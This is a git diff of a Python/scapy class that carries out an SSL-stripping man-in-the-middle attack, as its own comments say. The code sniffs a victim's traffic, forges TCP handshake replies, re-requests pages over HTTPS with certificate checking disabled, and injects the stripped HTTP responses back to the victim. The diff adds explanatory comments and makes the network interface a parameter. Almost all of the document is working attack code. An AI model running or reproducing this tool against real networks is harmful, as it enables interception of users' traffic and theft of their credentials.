@@ -4,11 +4,12 @@ import requests
 from scapy.layers.inet import IP, TCP
 from scapy.layers import http
 from scapy.layers.http import HTTPRequest
-#etherLayer = Ether(src=get_if_hwaddr(self.networkInterface), dst=pkt[Ether].src)
-#ipLayer = IP(src=pkt[IP].src, dst=pkt[IP].src)
-#tcpLayer = TCP(sport=8053, dport=1066, seq=1, ack=1)
 
-
+# Create objects to perform SSL strip
+# inp : victimIP = str
+# inp : TCPport = str
+# inp : interface = str
+# call start on object to start the attack
 class Ssl():
 
     def __init__(self, victimIP, TCPport, interface):
@@ -16,32 +17,41 @@ class Ssl():
         self.port = TCPport
         self.interface = interface
 
+    # takes packet from sniff
     def process_packet(self, pkt):
+        # check for TCP connection request from var:victimIP (first part of handshake)
         if pkt[TCP].flags == 'S':
             print("starting handshake")
-            etherLayer = Ether(src=get_if_hwaddr("enp0s3"), dst=pkt[Ether].src)
+
+            # creates and sends response to establish TCP connection (second part of handshake)
+            etherLayer = Ether(src=get_if_hwaddr(self.interface), dst=pkt[Ether].src)
             ipLayer = IP(src=pkt[IP].dst, dst=pkt[IP].src)
             tcpLayer = TCP(sport=pkt[TCP].dport, dport=pkt[TCP].sport, flags="SA", ack = pkt[TCP].seq + 1, seq = pkt[TCP].ack)
             ackpkt = etherLayer / ipLayer / tcpLayer
             sendp(ackpkt, verbose=0, iface=self.interface)
 
-
+        # check for http request from var:victimIP
         if pkt.haslayer(Raw) and pkt[IP].src == self.victimIP:
             data = str(pkt[Raw])
+
+            # parse http request using func:parsereq
             headers, req, getreq = self.parsereq(data)
 
+            # construct request and send to the https server which victim requests
+            # gets http response in var:response
+            response = requests.get("https://" + req + getreq, verify=False, headers=headers)
+            self.sendpkt(pkt, parse(response))
 
-            request = requests.get("https://" + req + getreq, verify=False, headers=headers)
-            self.sendpkt(pkt, parse(request))
-
-
+    # parses request from victim to use for the request to https server
+    # inp : data = pkt[RAW]
+    # ret : req = headers as dict
+    # ret : targeturl = domain name as str
+    # ret : getreq = pathname as str
     def parsereq(self, data):
         req = {}
         targeturl = ""
         getreq = ""
-        datasplit = data.split("\\r\\n")
-        #datasplit[0] = 'GET / HTTP/1.1'
-        #print(datasplit[0][6:len(datasplit[0])-9])
+        datasplit = data.split("\\r\\n") # arr headers
         datasplit[-1] = ''
         for i in datasplit:
             newi = i.split(": ")
@@ -56,31 +66,17 @@ class Ssl():
 
         return req, targeturl, getreq
 
-
+    # sends the stripped http response to var:victimIP
+    # inp : respnse = RAW http
     def sendpkt(self, pkt, response):
-        etherLayer = Ether(src=get_if_hwaddr("enp0s3"), dst=pkt[Ether].src)
+        etherLayer = Ether(src=get_if_hwaddr(self.interface), dst=pkt[Ether].src)
         ipLayer = IP(src=pkt[IP].dst, dst=pkt[IP].src)
         tcpLayer = TCP(sport=pkt[TCP].dport, dport=pkt[TCP].sport, ack = pkt[TCP].seq + 1, seq = pkt[TCP].ack, flags="FA")
-        response2 = "HTTP/1.1 401\r\n" \
-                   "WWW-Authenticate: Basic realm='Test'" \
-                   "Date: Mon, 27 Jul 2009 12:28:53 GMT\r\n" \
-                   "Server: Apache/2.2.14 (Win32)\r\n" \
-                   "Last-Modified: Wed, 22 Jul 2009 19:15:56 GMT\r\n" \
-                   "Accept-Ranges: bytes\r\n" \
-                   "Content-Length: 48\r\n" \
-                   "Keep-Alive: timeout=15, max=100\r\n" \
-                   "Connection: Keep-Alive\r\n" \
-                   "Content-Type: text/html\r\n\n" \
-                   "no auth header received\r\n\r\n"
 
         newpkt = etherLayer / ipLayer / tcpLayer / response
 
-        sendp(newpkt, verbose=0, iface="enp0s3")
+        sendp(newpkt, verbose=0, iface=self.interface)
 
     def start(self):
-
+        # sniffs packets on var:port and redirects to func:process_packet
         sniff(filter="port " + str(self.port), prn=self.process_packet, iface=self.interface)
-
-# test = Ssl("192.168.56.101", "8050", "enp0s3")
-#
-# test.start()
